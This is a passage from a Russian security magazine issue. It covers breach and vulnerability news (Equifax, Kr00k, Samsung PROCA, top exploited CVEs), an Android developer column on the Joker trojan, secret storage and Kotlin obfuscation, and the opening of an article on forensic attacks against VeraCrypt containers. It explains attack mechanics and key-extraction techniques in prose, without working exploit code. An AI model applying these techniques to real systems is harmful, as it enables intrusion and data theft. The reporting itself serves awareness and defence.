  бюро кредитных историй Equifax, стало известно в 2017 году. Тогда предста‐
   вители североамериканского подразделения Equifax сообщили, что зло‐
  умышленники завладели личной информа цией примерно 145 миллионов
  человек (всего в США проживает 324 миллиона человек), включая их номера
  социального страхования и водительских удос товере ний, полные имена
  и адреса. Также постра дали 15,2 миллиона жителей Великоб ритании и око‐
  ло 8000 канадских пользователей.
     Позже выяснилось, что мас штабы инци дента были даже серьезнее, чем
  предполагалось изначально. Так, компромета ции подверглись не только
  перечисленные данные, но и индивиду альные номера налогоплательщиков (в
  США ими пользуются те, кто не имеет номера социального страхования),
   email‐адреса пользователей, детальные данные о водительских удостовере‐
   ниях (в частности, даты и мес та выдачи документов) и даже информация
  о банковских картах.
     Злоумышленники  скомпрометирова ли  компанию  через  уязвимость
   в Apache  Struts. Взломщики  использовали  уяз вимость  CVE‐2017‐9805,
  которая была устранена еще в начале марта 2017 года. Так как взлом Equifax
  произошел уже после выхода патча, у компании было время на установку
  обновления, однако по какой‐то причине этим никто не озаботился.
    В рамках пресс‐конференции генеральный прокурор США Уильям Барр
   заявил, что эти хакеры предположитель но военные, члены Народно‐осво‐
  бодительной армии Китая, а также работа ют в так называемом «НИИ 54»
   (54th Research Institute), который часто упомина ется в связи с хакерски ми ата‐
   ками. По словам Барра, обвиняемые похитили не только данные о 145 мил‐
  лионах граждан США, но и закрытую информацию, принад лежавшую самому
  бюро кредитных историй Equifax.



         «Ответчики провели нес колько недель, выполняя раз личные зап росы
         с целью опре деле ния струк туры базы данных, а так же поис ка кон-
        фиденциальной и лич ной информа ции в сис теме Equifax.
          Получив дос туп к инте ресу ющим файлам, прес тупная груп па хра-
        нила укра денную информа цию во вре менных файлах, сжимая и раз-
         деляя  их,  чтобы  в итоге отпра вить  эти данные из сети  Equifax
         на компьюте ры за пре дела ми Соединенных Шта тов. Злоумыш ленники
        сде лали поряд ка 9000 зап росов в сис теме Equifax, извле кая име на,
        даты рождения и номера социального  стра хова ния аме риканских
        граждан.
         Обвиняемые  пред приняли  меры,  чтобы  избе жать  обна руже ния
         во вре мя ата ки. Так, они нап равляли тра фик пример но на 34 сер вера,
         рас положенных поч ти в 20 стра нах мира, чтобы скрыть свое реальное
        мес тоположение; использовали зашиф рованные каналы связи в сети
           Equifax, чтобы сме шаться с обыч ной сетевой активностью; ежед невно
         уда ляли сжа тые файлы и стирали файлы жур налов, стре мясь унич-
         тожить все записи о своей активнос ти», — рас ска зыва ют в Минюс те.

  В свою очередь, ФБР отмечает, что это крайне сложное дело, поскольку
   в распоряжении сле дователей исходно было очень мало информации: рас‐
  следование взлома Equifax фактически началось лишь с 40 IP‐адресов,
  которые использовались во время атаки.


  1 900 000 000 ВРЕДОНОСНЫХ ПРИЛОЖЕНИЙ


   Разработчики Google поделились статис тикой: в 2019 году пользовате ли Android пытались
   установить 1,9 миллиарда вре донос ных приложений из‐за пределов офи циального магазина
   Google Play Store (нап ример, из сторонних каталогов приложе ний и с различных сайтов).

  В 2017 и 2018 годах этот показатель находился на отметке 1,6 миллиарда.

  В Google объясняют, что данный показатель рас тет по двум основным причинам. Во‐первых,
   Play Protect с каждым годом все лучше обнаруживает и блокирует малварь. Во‐вторых, все
   больше пользователей Android устанавливают приложения из‐за пре делов Play Store, то есть
   используют сторонние сайты и магазины приложений. Как правило, из‐за того, что офи циаль‐
   ные магазины приложений им попросту недос тупны.





                                        Продолжение статьи →
← Начало статьи





 KR00K
  Специалисты компании ESET расска зали о новой уяз вимос ти Kr00k (CVE‐
   2019‐15126), которая может использовать ся для перехвата и дешифровки
   трафика Wi‐Fi (WPA2).
    По данным аналитиков, этой проб леме подвержены любые устройства,
  использующие решения компаний  Cypress  Semiconductor и Broadcom,
   от ноутбуков и смартфонов до роутеров и IoT‐девай сов. Специалисты протес‐
  тировали и подтвердили проблему для iPhone, iPad, Mac, Amazon Echo и Kin‐
   dle, Google Nexus, Samsung Galaxy, Xiaomi Redmi, Raspberry Pi 3, а также Wi‐Fi‐
  роутеров Asus и Huawei. В общей сложности проб лема угрожает примерно
  миллиарду разных гаджетов.
     Суть проблемы Kr00k сво дится к шифрованию, которое используется
  для защиты пакетов данных, переда ваемых пос редством Wi‐Fi. Как правило,
   такие пакеты шифруются уникальным ключом, который зависит от пароля Wi‐
    Fi, заданного пользователем. Но для чипов Broadcom и Cypress этот ключ
  обнуляется, если инициировать процесс диссоциации (disassociation), то есть
  временного отключения, которое обычно происходит из‐за плохого сигнала.
   Wi‐Fi‐устройства выполняют диссоциацию много раз за день, а затем авто‐
  матически переподключаются к ранее использованной сети.
    По словам экспертов ESET, ата кующие могут спровоцировать переход
  устройства в длительное сос тояние диссоциации и получить пред назначен‐
  ные ему Wi‐Fi‐пакеты. Затем, эксплуатируя баг Kr00k, дешиф ровать трафик
   Wi‐Fi с использованием «нулево го» ключа.





  Проблема Kr00k влияет только на Wi‐Fi‐соединения, использующие WPA2‐
   Personal и WPA2‐Enterprise WiFi, с шифрованием AES‐CCMP. То есть вклю‐
  чение протокола WPA3 на уязвимом устройстве должно защитить от описан‐
  ных специалистами атак. Кроме того, уязвимость вряд ли при годится опе‐
  раторам ботнетов для автоматизированных атак, так как требует, чтобы ата‐
  кующий находился неподалеку от жертвы (в радиусе действия сети Wi‐Fi).
    Иссле дователи  уведомили производителей об  уязвимости еще два
  месяца тому назад, так что к нас тоящему моменту многие устройства уже
  должны были получить патчи.
     Эксперты отмечают, что проблема Kr00k во многом похожа на нашумев‐
  шую уязвимость KRACK, обнаруженную в 2017 году и заставившую произво‐
  дителей поторопиться с переходом на WPA3, а также напоминает проблему
  DragonBlood, которая уже представляла угро зу и для WPA3. Вместе с этим
  подчеркивается, что Kr00k во многом отличается от своих «прародителей»
  и исправить последствия в данном случае будет проще.


  УЯЗВИМОСТИ В ВЕБ‐ПРИЛОЖЕНИЯХ

   Эксперты ком пании Positive Technologies проанализировали защищенность веб‐приложений
   и выяснили, что в девяти случаях из десяти злоумышленники могут атаковать посетителей сай‐
    та. Хотя число уязвимостей, которое в среднем приходится на одно приложение, снизилось
   по сравнению с прошлым годом почти в полтора раза, общий уровень защищен ности веб‐при‐
   ложений по‐прежнему оценивается как низкий.





                   Наиболее рас простра ненные уязвимости из списка OWASP Top 10

  6% приложений содержат уязвимости, позволяющие получить пол ный контроль над сис темой,
   а в 8% случаев — ата ковать внутреннюю сеть компании.

  В 2019 году существенно (на 17 процентных пунктов по сравнению с 2018 годом) снизилась
   доля веб‐приложений, содержащих уязвимости высоко го уровня риска.

  82% всех выявленных уязвимос тей оказались обус ловлены ошиб ками в коде. По словам
   экспертов, даже в случае продуктивных сис тем в каждой второй они находи ли уязвимос ти
   высокого уровня риска.

  В 45% исследованных веб‐приложе ний эксперты обнаружили недостатки аутентификации
   (Broken Authentication); многие уязвимос ти из этой категории критичес ки опасны.

  90% веб‐приложений под вержены угрозе атак на клиентов. Как и в пре дыду щие годы, сущес‐
   твенную роль в этом играет XSS.

   Примерами атак на пользовате лей могут быть заражение компьюте ров вредонос ным ПО
   (доля этого метода атак на частных лиц в третьем квартале года увеличилась до 62% про тив
  50% во втором квартале); фишинговые ата ки для получения учетных или других важных
   данных, а также выполнение действий от имени пользователя с помощью обманной техники
  кликджекинга, в частности для накрутки лайков и прос мотров.





 SAMSUNG ПОРТИТ
 ANDROID
  Специалист Google Project Zero Янн Хорн (Jann Horn) изучил ядро Android,
  поставляемое компанией Samsung с телефонами Galaxy A50, и заявил, что
  механизмы  безопасности, добавленные инженера ми Samsung  в  ядро,
  не только не обеспечива ют полноценной защиты, но и создают дополнитель‐
  ные векторы для атак.
     Хорн отмечает, что не про верял ядро в дру гих устройствах Samsung,
  но считает, что специфичные для это го про изво дителя модификации могут
   в целом создавать уязвимос ти и затруднять противодействие атакам. Хуже
   того, подобная практика широко рас пространена среди производителей
  смартфонов в целом: они нередко добавляют нечто спорное в код ядра Linux,
  причем upstream‐разработчики эти изменения не рассматривают и не могут
  проконтролировать.
    В частности, ядро Samsung включает в себя функцию, которая защищает
  пользовательские данные от чтения или изменения злоумышленниками.
  Но Хорн обнаружил, что эта функция не толь ко не справляется со своей
   задачей, но и имеет уяз вимости, которые можно использовать для выпол‐
  нения произвольного кода. Проб лема зат рагива ла допол нительную под‐
  систему безопасности Samsung, которая называ ется PROCA (или Process
   Authenticator).
     PoC‐эксплоит исследова теля демонс трирует, что злоумышленник может
   получить доступ к БД учетных записей, содержащей конфиденциальные
  токены аутентификации.
     Эксплуатация этой проб лемы также сопряжена со старой уяз вимостью —
  багом раскрытия данных в ядре Linux, который имеет идентификатор CVE‐
   2018‐17972. Эта проб лема давно была исправлена в ядре Linux и ядре An‐
   droid, но, как оказалось, не в ядре Android, которое компания Samsung
  использует для своих телефонов.



        «Защитные  механиз мы  Samsung  не  обес печива ют  полноценной
        защиты от злоумыш ленников, пыта ющихся взломать ваш телефон, они
        лишь блокиру ют прос тейшие root-инс тру менты, не кас томизирован-
        ные для устройств Samsung. Я считаю, что такие модификации не сто-
          ят затрат, так как они затрудняют переход на новое ядро (что должно
        происходить чаще, чем сейчас) и добав ляют дополнительное прос-
         транс тво для ата ки», — пишет Хорн.

  Он отмечает, что механизм PROCA предназна чен для ограничения атакующе‐
   го, который, по сути, уже получил пра ва на чтение и запись в ядре. И, по мне‐
  нию Хорна, Samsung могла бы создать более эффективную защиту, направив
  свои ресурсы на то, чтобы зло умышленник вообще не получил такого дос‐
   тупа.
     Разработчики Samsung уже испра вили эти и дру гие уязвимости (включая
  CVE‐2018‐17972) в рамках февральского вторника обновле ний.


  ТОП-10 УЯЗ ВИМОСТЕЙ


   Специалисты компании Recorded Future изучили работу популярных наборов эксплоитов, а так‐
   же наиболее заметные атаки 2019 года. На основании этих данных эксперты сос тавили список
   наиболее популярных и эксплуатируемых уязвимос тей года.

  В целом получилось, что топ состоит из весьма старых багов. Так, 6 из 10 вошедших в список
   проблем были весьма популярны у преступников и в 2018 году — все они затрагивают про дукты
    Microsoft: Internet Explorer и Microsoft Office. Не менее прочно держатся в топе и про‐
   дукты компании Adobe, включая Flash Player.
   Итоговый список выглядит следующим образом:


   CVE‐2018‐15982 (Adobe Flash Player);


   CVE‐2018‐8174 (Microsoft Internet Explorer);


   CVE‐2017‐11882 (Microsoft Ofﬁce);


   CVE‐2018‐4878 (Adobe Flash Player);


   CVE‐2019‐0752 (Microsoft Internet Explorer);


   CVE‐2017‐0199 (Microsoft Ofﬁce);


   CVE‐2015‐2419 (Microsoft Internet Explorer);


   CVE‐2018‐20250 (WinRAR);


   CVE‐2017‐8750 (Microsoft Internet Explorer);


   CVE‐2012‐0158 (Microsoft Ofﬁce).





 99 СМАРТФОНОВ
  Немецкий художник Саймон Векерт (Simon Weckert) устроил инте ресный пер‐
  форманс на улицах Берлина. Он нес пешно прогулял ся по городу, везя
  за собой маленькую красную тележку, в которой лежали 99 бюджетных подер‐
  жанных смартфонов с открытым приложением Google Maps.
    В результате на Google Maps по маршру ту Векерта образовалась сущес‐
   твующая только в вир туальности проб ка. Красная линия на картах показы‐
   вала, что поток машин в этом месте якобы едва движется (скорость движения
  составляла 2–4 мили в час).



        «Перевозя смар тфоны по улице, я могу генерировать вир туальный
         тра фик, из‑за чего автомобили будут нап равляться по дру гому мар-
        шру ту. Очень иронич но, но это может выз вать нас тоящую пробку
         в дру гом мес те города», — рас ска зыва ет художник.

  Для проведения своей акции Векерт арендовал 99 бюджетных Android‐смар‐
  тфонов и приобрел для них 99 SIM‐карт. Для соз дания несуществу ющего
  затора он просто гулял туда‐сюда по улицам, проводя по часу‐два на каждой
  намеченной точке маршру та. При этом, по его собс твенным наб людениям,
  для появления затора на картах хва тало минималь ного промежутка времени.





  Нужно отметить, что Векерт не первым додумался до такого саботажа. К при‐
   меру, еще в 2016 году издание The Washington Post рассказывало, как житель
  штата Мэриленд пытал ся облегчить движение по своей улице в час пик,
  оставляя в приложении Waze фальшивые сообщения о ДТП и установленных
  радарах для контроля скорости. Это сходило ему с рук на протяжении нес‐
   кольких недель, пока в итоге он не получил бан.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Эксперты обманули автопилот Tesla при помощи про ектора за 300 дол ларов


   Исследователи показали извлечение дан ных с изо лирован ного ПК через изме нение яркости
   экрана


  Вымогатель RobbinHood устанавливает на компьютеры жертв уязвимые драй веры Gigabyte


   Криптовалютная биржа Altsbit закрывается пос ле взлома


   Арестован оператор миксер‐сервиса Helix, через который было отмыто более 300 миллионов
   долларов


  ФАС доработала пра вила предустановки отечествен ного ПО на смартфоны и прочие гаджеты


   Уязвимости SweynTooth угрожают множеству продуктов с поддер жкой BLE


   Сеть криптовалюты IOTA временно не работает пос ле атаки на официальный кошелек проекта


   Злоумышленники ком прометируют поддомены Microsoft


   Релиз Chrome 80 помешал работе малвари AZORult и мар кетплейса Genesis
HEADER

 ANDROID





        SECURITY‐НОВШЕСТВА
        ANDROID 11 И НАТИВНАЯ
        ВЕРСИЯ ТРОЯНА JOKER





Сегодня в выпус ке: security‐новшества An‐
droid  11, анализ нативной версии тро яна
Joker, советы о хранении секретных данных
в приложении, способ усо вершенствовать
обфускацию кода на Kotlin, а так же лучшие          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
инструменты  разработчика  для  Android              zobnin@glc.ru
и очередная подборка полезных библиотек.


                ПОЧИТАТЬ


Security-новшества Android 11 DP1
Turning it up to 11: the ﬁrst Developer Preview of Android 11 — статья о новшес‐
твах Android 11 Developer Preview 1. Мы, как обычно, сконцентрируемся
на приватности и безопасности.
 • Од норазо вые раз решения. Начиная с Android 11 пользователь сможет
   дать разрешение на ту или иную операцию только на один раз. Как только
   приложение будет свернуто, оно потеря ет разрешение, и его придется
   запрашивать снова.
 • Scoped Storage. Android 11 закроет приложениям прямой дос туп к фай‐
  лам на внутренней и внешней картах памяти, но только в том случае, если
   target API приложения равен 30.
 • Расширен ный API биометрической аутен тификации. В API Biomet‐
   ricPrompt, реализующем диалог биометричес кой аутентификации, появи‐
   лась поддержка трех типов аутентифика ции: надежный, слабый и учетные
   данные устройства.
 • Но вые средства защиты от экспло итов. Разработчики расширили
   применение механизмов защиты, работающих на этапе компиляции: CFI
   (Control Flow  Integrity), BoundSan, IntSan  (Integer Overﬂow  Sanitization)
   и ShadowCallStack. Для выявления проб лем при работе с памятью в при‐
   ложениях включена проверка ука зателей в куче на основе привязанных
   к ним тегов (heap pointer tagging). Также разработ чики могут использовать
   специальный системный образ, в котором включен отладочный механизм
  HWAsan (Hardware‐assisted AddressSanitizer).
 • API для безопасного обме на дан ными. Появился API BlobStoreMan‐
   ager для безопасного обмена бинарными данными между приложениями.
   Его можно использовать, нап ример, для передачи моделей данных
  машинного обучения.
 • Хранилище докумен тов. Добавилась поддержка безопас ного хра‐
   нения и извлечения проверя емых идентифика ционных документов, таких
   как электронные водительские удостоверения.





             Одноразовые раз решения в Android 11


Как работают одно разо вые раз решения Android 11
Exploring the Android 11 Developer Preview: Permission Changes — статья, пояс‐
няющая работу одноразовых разрешений. Основные моменты:
 • Одноразовое разрешение будет отоз вано, как только запросившая раз‐
  решение активность (экран) приложения уйдет в фон (пользователь вер‐
   нется на домашний экран или откроет дру гое приложе ние).
 • Если у приложе ния есть foreground‐сервис, который был активен в момент
   ухода активности в фон и ее воз вра та, то одноразовое разрешение будет
   возвращено этой активнос ти.
 • В предыдущих версиях Android пользователь мог запретить повторный
   показ запроса определенного раз решения с помощью чекбокса Don’t ask
   again. Android 11 заблокиру ет повторный показ запроса, если поль‐
   зователь два раза откажет ся предос тавлять раз решение.
 • Исключение из предыду щего правила: если пользователь нажмет кнопку
   «Назад», чтобы закрыть диалог запроса раз решения, это будет интерпре‐
   тировано как отказ предоставлять раз решение, но запрос будет появлять‐
   ся снова. Однако это не относится к тем диало гам запроса разрешений,
   которые перекидывают пользователя в настройки.

Отдельно автор отмечает, как изменилась работа разрешения на доступ
к местоположению в фоне. Это разрешение появилось в  Android  10,
но начиная с Android 11 приложение не может запросить его у пользователя.
Единственный способ получить раз решение — перекинуть пользователя
в окно настроек приложения и попросить включить его вручную.





              Как работает отказ предос тавлять разрешение


Анализ нативной версии тро яна Joker
A closer look at the native speaking Android Joker malware from Google Play —
анализ новой версии трояна Joker, большая часть кода которого вынесена
в нативную библиотеку.
  Впервые  Joker  (или  Bread  в  терминологии  Google)  обнаружили
в 2017 году. Это был троян, распространяющийся через Google Play и под‐
писывающий поль зователя на разного рода платные услу ги, в том числе тре‐
бующие подтверждения по SMS (он умел перехватывать сооб щения и ана‐
лизировать их содержимое).
  Со временем Joker эво люционировал нас толь ко, что использовал прак‐
тически все известные техники скрытия и обфускации, а в начале года
в Google Play стали находить все больше вари антов Joker, часть компонентов
которого вынесена в нативный код.
  Одно из приложений, внутри которого обнаружили новую версию Joker, —
VPN‐клиент Fast VPN. По сути, это перепа кованная версия приложения Thun‐
der VPN, которая при старте приложения запус кает в фоне зловредный код.
Часть функциональности трояна при этом вынесена в нативную библиоте ку
libpdker.so, пропущенную через обфускатор на базе LLVM.
  Нативная библиотека включает в себя базовую функциональность трояна,
например функции для работы с SIM‐картами и обра ботки SMS (которые тро‐
ян получает с помощью дос тупа к уведомлениям). Также нативная библиотека
отвечает за прием команд от управляющего сервера (C&C). Набор команд
и их формат, в сущности, остался прежним, как и использование голого HTTP
в качестве протокола.
  Интересно, что в отличие от прошлых версий тро яна эта версия не исполь‐
зует какой‐то специальной формы обфуска ции имен методов. Некоторые
имена просто случайны (Kanble, Yunbe, PtCher, VenNor), другие похожи
на слегка измененные (QertOptor — QueryOperator, ReterString — Return‐
String, WenNoti — WhenNotiﬁed, pdker — Joker?), еще одни никак не изме нены
(BigConﬁg, BleOpenSettings, HuOpenSettings). Но обфускация строк стала
еще более запутанной.
  В целом эта версия трояна больше похожа на эксперимент, чем на раз‐
витие.


              РАЗРАБОТЧИКУ


Как хранить сек реты
Protecting secrets in an Android project — статья о том, как правильно хранить
секреты, например клю чи API, в своем приложении.
  Все  сек ретные стро ки  луч ше вынести  в отдельный файл,
который хранится вне системы контроля версий. Это позволит избежать
недоразумений, когда раз работчик заливает код в открытый репозиторий
и таким образом выставля ет ключи на всеобщее обоз рение. Также такой под‐
ход позволяет расшаривать ключи между несколь кими приложениями. Сек‐
реты можно хранить, нап ример, в файле ~/.gradle/gradle.properties:


GameCatalogueApp_UploadKeystore_KeyPassword=aaaabbbbcccc
GameCatalogueApp_AuthClientSecret=123456789
GameCatalogueApp_Pusher_APIKey=ksldjalksdjskald

Что бы сде лать их доступны ми в исходном коде, можно использовать
приблизительно такой трюк (пример для скрипта Gradle на Kotlin):


defaultConfig {
  buildConfigField(
    "String",
    "AUTH_CLIENT_SECRET",
    buildConfigProperty("GameCatalogueApp_AuthClientSecret")
  )


  resValue(
    "string",
    "pusher_key",
    propertyOrEmpty("GameCatalogueApp_Pusher_APIKey")
  )
}


fun Project.buildConfigProperty(name: String) = "\"${propertyOrEmpty(
name)}\""


Что бы защитить сек реты не только от уте чек, но и от реверса
приложе ния, их стоит зашифровать. Для это го необходимо помес тить клю‐
чи в конфиг Gradle уже в зашифрованной форме и рас шифровывать их
с помощью ключа, тоже записанного в конфиг Gradle. Чтобы затруднить жизнь
взломщику, ключ можно обфусцировать. Например, добавить к нему случай‐
ные данные или перемешать час ти ключа и уже в коде приложения привес ти
его в нужный вид.


Об фускация кода Kotlin
Is Your Kotlin Code Really Obfuscated? — статья, посвященная обфускации
кода на языке Kotlin, а точнее тому, когда эта обфускация может не сработать.
Автор приводит следующий пример кода:


class SomeClass {
    lateinit var importantVar: String


    fun funcWithParams(importantString: String, importantList: List<
Int>) {
    }


    fun String.importantExtensionFunc() {
    }
}

Если скомпилировать этот код, а затем декомпилировать его в Java, мы
получим следующую картину:


public final class SomeClass {
   @NotNull public String importantVar;


   @NotNull
   public final String getImportantVar() {
      String var10000 = this.importantVar;
      if (var10000 == null) {
         Intrinsics.throwUninitializedPropertyAccessException("import
antVar");
      }
      return var10000;
   }


   public final void funcWithParams(@NotNull String importantString,
@NotNull List importantList) {
      Intrinsics.checkParameterIsNotNull(importantString, "import
antString");
      Intrinsics.checkParameterIsNotNull(importantList, "import
antList");
   }


   public final void importantExtensionFunc(@NotNull String
$this$importantExtensionFunc) {
      Intrinsics.checkParameterIsNotNull($this$importantExtensionFunc
, "$this$importantExtensionFunc");
   }
}

Обрати внимание, что появилась проверка параметров функций на  null
с помощью методов объекта Intrinsics. Это часть особенности  Kotlin
под названием null safety, которая гарантиру ет, что ты не сможешь обратиться
к методам или полям null‐объекта или случайно присвоить объекту значение
null.
  А теперь посмотри на тот же код, но пос ле обфускации с помощью Pro‐
Guard (в новых версиях Android Studio его работу выполняет опти мизатор R8):


public final class a {
   public String a;


   public final String a() {
      String var1 = this.a;
      if (var1 == null) {
         b.b("importantVar");
      }
      return var1;
   }


   public final void a(String var1) {
      b.b(var1, "$this$importantExtensionFunc");
   }


   public final void a(String var1, List var2) {
      b.b(var1, "importantString");
      b.b(var2, "importantList");
   }


   public final void b() {
      String var1 = this.a;
      if (var1 == null) {
         b.b("importantVar");
      }
      this.a(var1);
   }
}

Снова обрати внимание на вызов функций Intrinsics, которые теперь имеют
имя вроде b.b. Несмотря на то что в результате обфускации параметры фун‐
кций получили имена var1 и var2, функция про верки на null все равно выдает
их реальные име на (importantVar, importantList и так далее).
  Побороть эту проб лему можно, отключив саму функцию проверки на null
в продакшен‐коде. Это никак не повлияет на ста биль ность приложе ния, пос‐
кольку код проверки на null в рантайме нужен лишь в качестве средства
отладки/диагностики, а не защиты от падения или обеспечения правильной
работоспособности (фактически эти функции прос то завершают приложение
с исключением IllegalStateException).
   Итак, открываем файл proguard‐rules.pro приложения и добавляем
в него следующие строки:


‐assumenosideeffects class kotlin.jvm.internal.Intrinsics {
    public static void checkExpressionValueIsNotNull(java.lang.Object
, java.lang.String);
    public static void checkFieldIsNotNull(java.lang.Object, java.
lang.String);
    public static void checkFieldIsNotNull(java.lang.Object, java.
lang.String, java.lang.String);
    public static void checkNotNull(java.lang.Object);
    public static void checkNotNull(java.lang.Object, java.lang.
String);
    public static void checkNotNullExpressionValue(java.lang.Object,
java.lang.String);
    public static void checkNotNullParameter(java.lang.Object, java.
lang.String);
    public static void checkParameterIsNotNull(java.lang.Object, java
.lang.String);
    public static void checkReturnedValueIsNotNull(java.lang.Object,
java.lang.String);
    public static void checkReturnedValueIsNotNull(java.lang.Object,
java.lang.String, java.lang.String);
    public static void throwUninitializedPropertyAccessException(java
.lang.String);
}


Инстру мен ты раз работчика в 2020 году
Our Android 2020 development stack — статья разработчиков компании Karumi
об используемых инструментах раз работки. Десятки инстру ментов разбиты
на семь категорий.
   Статический анализ и сборка:
 •  Ktlint — лучший линтер для языка Kotlin;
 • Android Lint — стандартный линтер Android;
 • Lin — инструмент, позволяющий удоб но соз давать кастомные правила
   для линтера;
 • Ribbonizer — плагин Gradle, авто матически добавляющий отметку Beta
   или Debug к иконке приложения;
 • Play  publisher — автоматизиру ет процесс пуб ликации новой версии
   в Google Play Store.

Инструменты для работы с сетью:
 • Retroﬁt — существенно упрощает реализацию REST API;
 • OkHTTP — луч ший HTTP‐клиент;
 • Gson — известная биб лиотека для трансляции JSON в объекты Java/Kotlin.

Хранение данных:
 • Room — обертка для SQLite, раз вива емая Google;
 • SQLDelight — генерирует Kotlin API для SQL‐запросов.

Разрешения:
 • Dexter — библиотека, позволяющая обрабатывать запросы разрешений
   с помощью кол бэков вместо неудобного в использовании onActivityResult.

Пользовательский интерфейс:
 • Data Binding — библиотека биндинга View (часть Android Jetpack);
 • Lifecycle Observer — обсервер данных для UI (Android Jetpack);
 • Appcompat — библиотека совмести мости для ста рых версий Android (An‐
   droid Jetpack);
 • ConstraintLayout —  подстра иваемый  под  ситуацию  лейаут  (Android
   Jetpack);
 • Glide — библиотека загрузки изоб ражений;
 • Renderers — одна из лучших библиотек для работы с RecyclerView;
 • Calligraphy — библиотека для работы с кас томными шрифтами (Android
   поддерживает аналогичную функцию с 2017 года);
 • Material Components — компоненты в стиле  Material Design (Android
   Jetpack);
 • Snacky — библиотека для показа снекбаров (небольшое сообщение
   в нижней части экрана);
 • Lottie — библиотека для рендерин га ани мации, соз данной в Adobe After
   Eﬀects.

Основные инструменты:
 • Kotlin — без коммента риев;
 • Kotlin Coroutines — лучший инс трумент асин хронного программирования;
 • Timber — расширяемый лог гер;
 • Libphonenumber — лучший инс трумент для работы с номерами телефонов;
 • OneSignal — один из лучших провайдеров push‐уведомлений;
 • Kodein — фреймворк для Dependency Injection;
 • ThreeTenABP — бэкпорт функций для работы со временем из Java 8;
 • Crashlytics — один из лучших инс трументов для соз дания отчетов об ошиб‐
   ках и работы с ними;
 • Arrow — библиотека функционального программирования для Kotlin;
 • Leakcanary — лучший инс трумент детекта утечек памяти.

Тестирование:
 • JUnit — классический инстру мент запус ка тестов;
 • Shot — библиотека для тестирования по скрин шотам;
 • Kotlin Snapshot — библиотека для снап шот‐тестирования;
 • Kotlin Test — фреймворк для тес тирова ния кода на Kotlin;
 • Mockito — mock‐фреймворк;
 • MockWebServer — вир туальный веб‐сервер для тестирования;
 • Robolectic — фреймворк для тес тирова ния, поз воляющий запус кать тесты
  быстро без исполь зования полноценного эмулятора;
 • Espresso — библиотека UI‐тес тирования;
 • Barista — упрощает создание тес тов с использованием Espresso;
 • Jacoco — инструмент оценки покрытия кода тес тами;
 • Bitrise — лучшая платформа для CI‐ и CD‐раз работки.


             ИНСТРУМЕНТЫ


 • FRIDA‐DEXDump — скрипт Frida для поиска dex‐файлов в оперативной
   памяти, может быть использован для борьбы с упаковщиками.


              БИБЛИОТЕКИ


 • OpenPush — фреймворк для реализации push‐уведомлений с исполь‐
   зованием собственного сервера;
 • Dependency‐analysis‐android‐gradle‐plugin — плагин Gradle для анализа
   зависимостей и связи между ними;
 • Rainbow — создание градиентного фона для любого View;
 • KaMPKit — темплейт для соз дания мультиплатформенного приложения
   на Kotlin;
 • Kronos‐Android — SNTP‐библиотека на языке Kotlin;
 • RateBottomSheet — диалог «Оцените при ложение»;
 • Android‐NFC — библиотека для работы с NFC;
 • Cycler — библиотека для декларативной конфигурации RecyclerView (раз‐
   работчик: Square);
 • Madman‐android — библиотека для показа видеорекламы;
 • CurveGraphView — компонент, отоб ражающий сглаженные графики;
 • FragNav — компонент для управления различны ми стеками фрагментов;
 • Time —  мультиплатфор менная биб лиотека  для изме рения  вре мени
   на Kotlin;
 • Wormhole — библиотека, поз воляющая использовать некоторые  API
   из новых версий Android в старых версиях;
 • Android‐framer — скрипт для добавления фрейма телефона вокруг скрин‐
   шотов;
 • LiveStream‐kt — реактивная библиотека для обмена данными между ком‐
   понентами приложения;
 • CustomEditTextOulinedBorder — поле ввода с обводкой, меняющей цвет
   в зависимости от введен ных данных;
 • FacebookLikeReaction — кнопки реакций на манер Facebook;
 • Android‐Localization — библиотека для смены языка приложе ния на лету;
 • Filebox — библиотека для асинхронной загрузки фай лов из сети.
COVERSTORY
 КАК УКРЕПИТЬ
 ВЕРУ





       ДЕЛАЕМ ШИФРОВАННЫЕ
       КОНТЕЙНЕРЫ VERACRYPT
         НЕПРИСТУПНЫМИ





Ты пользуешься VeraCrypt и всегда выбира‐
ешь  самый  надежный  алго ритм  шиф‐
рования и длинный пароль, надеясь, что так
ты сделаешь контейнер неприступ ным? Эта
статья  перевернет  твои  представления           Олег Афонин                                                                                      Эксперт по мобильной
о том, как работает безопасность крип‐       криминалистике«Элкомсофт»компании
токонтейнеров, и покажет, что на самом        aoleg@voicecallcentral.com
деле  влияет  на  стойкость  контейнера
к взлому.


VeraCrypt — наиболее популярный форк зна менитого средс тва шифрования
TrueCrypt. Почему ему часто отда ют предпочтение? На стороне VeraCrypt —
открытый исходный код, а также собственный и более защищенный по срав‐
нению с TrueCrypt фор мат виртуальных и зашифрованных дисков. Исходники
VeraCrypt проходили независимый аудит, и найденные уязвимости с тех пор
закрыли, что сделало «Веру» еще надежнее.


КАК ВЗЛАМЫВАЕТ КОНТЕЙНЕРЫ VERACRYPT ПОЛИЦИЯ
Эта статья не о том, как ломать криптоконтейнеры. Однако, если ты не зна‐
ешь, как станут действовать эксперты, пытающиеся получить доступ к зашиф‐
рованным данным, будет трудно понять смысл опи санных действий.
  Действия эксперта в лабора тории зависят от того, что именно и каким
именно образом изъято при обыс ке.


Стан дартные методы
Самый типичный случай — изъ ятие внеш них накопителей целиком; компьюте‐
ры выключаются и также изымаются целиком, но в лабораторию к эксперту
попадает не целый компьютер в сбо ре, а только извлеченные из него диски.
  Подобный сценарий — тот самый слу чай, про тивостоять которому так дол‐
го  готовились  разработчики  всех  криптоконтей неров  без  исключения.
Лобовые атаки на криптоконтейнеры малоэффективны, а на некоторые их
разновидности   (в  частнос ти,  загрузочные  разделы,  зашифрованные
в режиме TPM или TPM + ключ) неэффективны абсо лютно.
  В типичном случае эксперт попытается сна чала проанализировать файлы
гибернации и подкачки. Если пользователь пренеб рег настройками безопас‐
ности криптоконтейнера (кстати, при использовании BitLocker эти нас тройки
далеко не очевидны), то ключи шифрования спо кой но извлекаются из этих
файлов, а зашифрованные тома рас шифровыва ются без длительных атак.
Разумеется, в ряде случаев эта ата ка не сра бота ет. Она будет бесполез на,
если выполнено хотя бы одно из описанных ниже условий.
   1. Загрузоч ный диск зашифрован. В этом случае и файл подкачки,
и файл гибернации будут также зашифрованы. Например, если для шиф‐
рования загрузочного раздела используется BitLocker (это имеет смысл,
даже если остальные данные зашифрованы в контей нерах VeraCrypt), то Mi‐
crosoft подробно описыва ет модель безопасности в FAQ и BitLocker Security
FAQ (раздел What are the implications of using the sleep or hibernate power man‐
agement options?). Кстати, из этого пра вила есть исключения — например,
